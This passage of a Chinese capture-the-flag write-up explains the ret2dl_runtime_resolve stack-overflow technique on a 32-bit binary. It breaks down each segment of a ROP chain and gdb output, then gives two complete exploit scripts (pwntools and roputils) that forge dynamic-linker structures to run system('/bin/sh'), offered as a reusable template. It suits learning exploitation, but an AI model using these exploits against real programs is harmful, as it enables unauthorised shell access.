  * 先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve
  * 然后传入偏移,32位是用栈传参的，也就是这样
  * 如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0
#### 第三部分
    rop.raw('bbbb')
    rop.raw(base_stage+82)
  * bbbb为返回地址
  * base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数  
这里具体为什么是这里，你可以从gdb调试看出来，他里面
        gdb-peda$ disassemble _dl_runtime_resolve
    Dump of assembler code for function _dl_runtime_resolve:
    => 0xf7f7e6c0 : push   eax
     0xf7f7e6c1 : push   ecx
     0xf7f7e6c2 : push   edx
     0xf7f7e6c3 : mov    edx,DWORD PTR [esp+0x10]
     0xf7f7e6c7 : mov    eax,DWORD PTR [esp+0xc]
     0xf7f7e6cb :    call   0xf7f78ac0 
     0xf7f7e6d0 :    pop    edx
     0xf7f7e6d1 :    mov    ecx,DWORD PTR [esp]
     0xf7f7e6d4 :    mov    DWORD PTR [esp],eax
     0xf7f7e6d7 :    mov    eax,DWORD PTR [esp+0x4]
     0xf7f7e6db :    ret    0xc
    End of assembler dump.
  * 从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了  
看参数  
  * 这里arg[0]就是返回地址，
  * arg[1]就是参数了
  * 符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧
#### 第四部分
    rop.raw('bbbb')
    rop.raw('bbbb')
  * 进行填充，使位置达到base_stage + 24
#### 第五部分
    rop.raw(fake_sys_rel)
  * 填入.rel.plt里的一个结构体，用于解析函数
#### 第六部分
    rop.raw(align * 'a')
  * 填充对齐部分  
#### 第七部分
        rop.raw(fake_sys)
  * 这里填入的是一个结构体，大小为0x10，fake_sys->st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了
#### 第八部分
    rop.raw('system\x00')
#### 第九部分
    rop.raw('a'*(80 - len(rop.chain())))
    print len(rop.chain())
  * 这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh  
#### 第十部分
        rop.raw(sh+'\x00')
    rop.raw('a'*(100 - len(rop.chain())))
    io.sendline(rop.chain())
    io.interactive()
完整构造就这样完成了，接下来直接打就能成功了。  
先贴上完整exp
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    offset = 44
    elf = ELF('./pwn')
    io = process('./pwn')
    rop = ROP('./pwn')
    bss_addr = elf.bss()
    stack_size = 0x800
    base_stage = bss_addr + stack_size
    rop.raw('a'*offset)
    rop.read(0, base_stage, 100)
    rop.migrate(base_stage)
    #gdb.attach(io)
    io.sendline(rop.chain())
    rop = ROP('./pwn')
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
    fake_sym_addr = base_stage + 32
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr += align
    index_dynsym = (fake_sym_addr - dynsym)/0x10
    st_name = fake_sym_addr + 0x10 - dynstr
    fake_sys = flat([st_name, 0, 0, 0x12])
    index_offset = base_stage + 24 - rel_plt
    read_got = elf.got['setvbuf']
    r_info = index_dynsym << 8 | 0x7
    fake_sys_rel = flat([read_got, r_info])
    sh = '/bin/sh'
    rop.raw(plt0)
    rop.raw(index_offset)
    rop.raw('bbbb')
    rop.raw(base_stage+82)
    rop.raw('bbbb')
    rop.raw('bbbb')
    rop.raw(fake_sys_rel)
    rop.raw(align * 'a')
    rop.raw(fake_sys)
    rop.raw('system\x00')
    rop.raw('a'*(80 - len(rop.chain())))
    print len(rop.chain())
    rop.raw(sh+'\x00')
    rop.raw('a'*(100 - len(rop.chain())))
    gdb.attach(io)
    io.sendline(rop.chain())
    io.interactive()
终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。
## 通杀
  * 其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路
  * 其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime
  * 理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了  
**接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了**
    #!/usr/bin/env python
    # coding=utf-8
    from roputils import *
    from pwn import process
    from pwn import gdb
    from pwn import context
    processName = 'pwn'
    offset = 44
    r = process('./' + processName)
    context.log_level = 'debug'
    rop = ROP('./' + processName)
    bss_base = rop.section('.bss')
    buf = rop.fill(offset)
    buf += rop.call('read', 0, bss_base, 100)
    ## used to call dl_Resolve()
    buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    r.send(buf)
    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    ## used to make faking data, such relocation, Symbol, Str
    buf += rop.dl_resolve_data(bss_base + 20, 'system')
    buf += rop.fill(100, buf)
    r.send(buf)
    r.interactive()
是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已
## 总结：
  * 以后遇到高级ROP这种题就一把梭了
  * 妈妈在也不用担心我遇到栈的这种问题了
  * 我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了
题目和exp我已经上传到附件里